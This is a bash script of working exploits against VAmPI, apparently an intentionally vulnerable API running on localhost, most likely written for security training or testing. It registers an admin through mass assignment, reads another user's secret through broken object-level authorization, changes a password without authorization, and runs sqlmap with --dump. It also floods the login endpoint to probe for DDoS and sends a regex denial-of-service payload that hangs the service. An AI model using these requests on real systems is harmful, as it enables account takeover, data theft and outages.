#!/bin/bash
VPORT=$1
echo $VPORT
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo "Creating database"
curl http://localhost:$VPORT/createdb

echo "
Getting token for name1 user"
name1_token=$(curl --location "http://localhost:$VPORT/users/v1/login" \
--header 'Content-Type: application/json' \
--header 'Accept: application/json' \
--data '{
  "username": "name1",
  "password": "pass1"
}' | cut -d ' ' -f2)
name1_token=${name1_token:1:-2}

# Creation of admin user:
echo "Creation of admin user exploit"
curl --location "http://localhost:$VPORT/users/v1/register" \
--header 'Content-Type: application/json' \
--header 'Accept: application/json' \
--data-raw '{
  "email": "megamail@gmail.com",
  "password": "multipass",
  "username": "ilya",
  "admin": true
}'

echo "
Checking if user ilya is admin"
curl http://localhost:$VPORT/users/v1/_debug

# Broken object level authorization
echo "
Broken object level authorization exploit:"
echo "Creating token for user ilya"

ilya_token=$(curl --location "http://localhost:$VPORT/users/v1/login" \
--header 'Content-Type: application/json' \
--header 'Accept: application/json' \
--data '{
  "username": "ilya",
  "password": "multipass"
}' | cut -d ' ' -f2)
ilya_token=${ilya_token:1:-2}

echo "Creating book with secret under ilya user"
curl --location "http://localhost:$VPORT/books/v1" \
--header 'Content-Type: application/json' \
--header 'Accept: application/json' \
--header "Authorization: Bearer $ilya_token" \
--data '{
  "book_title": "lotr",
  "secret": "sauron_secret"
}'

echo "
Getting full info about ilya's book using name1 user token"
curl --location "http://localhost:$VPORT/books/v1/lotr" \
--header 'Accept: application/json' \
--header "Authorization: Bearer $name1_token"

# Unauthorized password change
echo "
Unauthorized password change exploit:"
echo "Changing ilya's password to megapass using name1 user token"
curl --location --request PUT "http://localhost:$VPORT/users/v1/ilya/password" \
--header 'Content-Type: application/json' \
--header 'Accept: application/json' \
--header "Authorization: Bearer $name1_token" \
--data '{
  "password": "megapass"
}'

echo "
Checking that password was changed"
curl http://localhost:$VPORT/users/v1/_debug

# SQLMAP sql injections
echo "
Running sqlmap for sql injection"
yes Y | sqlmap -u "http://localhost:$VPORT/users/v1/*name1*" --method=GET \
--headers="Accept: application/json\nAuthorization: Bearer $name1_token\nHost: localhost:$VPORT" --dump --flush-session


# Rate Limiting abscence
# Number of requests to send
NUM_REQUESTS=500
RATE_LIMIT_EXCEEDED=false

echo "Sending 500 login requests"
for i in $(seq 1 $NUM_REQUESTS); do
    RESPONSE=$(curl -X POST "http://localhost:$VPORT/users/v1/login" \
        --header 'Content-Type: application/json' \
        --header 'Accept: application/json' \
        --data '{"password": "pass1","username": "name1"}' \
        -s -o /dev/null -w "%{http_code}")
    echo "Response Code: $RESPONSE"
    
    if [[ "$RESPONSE" == "000" || "$RESPONSE" == "403" ]]; then
        RATE_LIMIT_EXCEEDED=true
    fi
done

if $RATE_LIMIT_EXCEEDED; then
    echo "Rate limit exceeded, ddos impossible"
    echo "Sleep for 16 seconds"
    sleep 16
else
    echo "No rate limits encountered, ddos is possible"
fi


# RegexDOS
name1_token=$(curl --location "http://localhost:$VPORT/users/v1/login" \
--header 'Content-Type: application/json' \
--header 'Accept: application/json' \
--data '{
  "username": "name1",
  "password": "pass1"
}' | cut -d ' ' -f2)
name1_token=${name1_token:1:-2}

curl http://localhost:$VPORT/users/v1/_debug

echo "
RegexDOS exploit:"
zeroes=$(python3 -c "print('0' *3457)")

echo "Sending an email change request with huge input.
YOU have to manually stop the script, because it won't answer. Restart of VAmPI will be required!"
curl --location --request PUT "http://localhost:$VPORT/users/v1/ilya/email" \
--header 'Content-Type: application/json' \
--header 'Accept: application/json' \
--header "Authorization: Bearer $name1_token" \
--data "{
  \"email\": \"$zeroes\"
}"
